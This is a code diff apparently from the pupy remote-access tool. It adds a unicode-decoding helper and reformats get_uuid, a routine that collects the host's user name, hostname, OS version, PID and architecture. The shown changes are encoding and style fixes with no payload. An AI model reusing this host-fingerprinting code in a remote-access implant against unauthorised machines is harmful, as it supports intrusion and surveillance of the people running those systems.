@@ -4,6 +4,7 @@ from __future__ import absolute_import
 from __future__ import division
 from __future__ import print_function
 from __future__ import unicode_literals
+
 import platform
 import getpass
 import uuid
@@ -15,6 +16,18 @@ import socket
 import pupy
 
 import encodings
+
+def _as_unicode(x):
+    if isinstance(x, bytes):
+        try:
+            return x.decode(sys.getfilesystemencoding())
+        except UnicodeError:
+            try:
+                return x.decode('UTF-8')
+            except UnicodeError:
+                return x.decode('latin1')
+
+    return x
 
 # Restore write/stdout/stderr
 
@@ -269,24 +282,18 @@ def get_uuid():
     integrity_level = None
 
     try:
-        if sys.platform=="win32":
-            user = GetUserName().encode("utf8")
+        if sys.platform == 'win32':
+            user = _as_unicode(GetUserName())
         else:
-            user = getpass.getuser().decode(
-                encoding=os_encoding
-            ).encode("utf8")
+            user = _as_unicode(getpass.getuser())
     except Exception as e:
         logging.exception(e)
-        user='?'
+        user = '?'
 
     try:
-        hostname = platform.node().decode(
-            encoding=os_encoding
-        ).encode("utf8")
-
+        hostname = _as_unicode(platform.node())
         if sys.platform == 'win32' and user.startswith(hostname + '\\'):
             user = user.split('\\', 1)[1]
-
     except Exception:
         pass
 
@@ -298,7 +305,7 @@ def get_uuid():
         pass
 
     try:
-        version=platform.platform()
+        version = platform.platform()
     except Exception:
         pass
 
@@ -334,32 +341,32 @@ def get_uuid():
         pass
 
     try:
-        release=platform.release()
+        release = platform.release()
     except Exception:
         pass
 
     try:
-        version=platform.version()
+        version = platform.version()
     except Exception:
         pass
 
     try:
-        machine=platform.machine()
+        machine = platform.machine()
     except Exception:
         pass
 
     try:
-        pid=os.getpid()
+        pid = os.getpid()
     except Exception:
         pass
 
     try:
-        osname=os.name
+        osname = os.name
     except Exception:
         pass
 
     try:
-        proc_arch=platform.architecture()[0]
+        proc_arch = platform.architecture()[0]
     except Exception:
         pass
 
